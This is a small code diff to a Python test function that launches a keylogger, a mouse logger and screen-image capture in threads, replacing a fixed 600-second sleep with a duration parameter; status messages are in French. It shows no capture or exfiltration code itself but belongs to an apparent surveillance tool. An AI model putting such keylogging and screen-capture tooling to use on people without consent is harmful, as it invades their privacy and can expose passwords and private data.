@@ -13,7 +13,7 @@ def main():
     #test_threading()
     pass
 
-def test_threading():
+def test_threading(duration):
     klog = keylog.KeyLogger() 
     mlog = Mouselogger.Mouselog()
     getIm = getImage.GetImage()
@@ -24,7 +24,7 @@ def test_threading():
     print("mouselog lancé")
     getIm.start()
     print("Capture Image lancée")
-    time.sleep(600)
+    time.sleep(duration)
     klog.stop()
     print("keylog arrêté")
     mlog.stop()
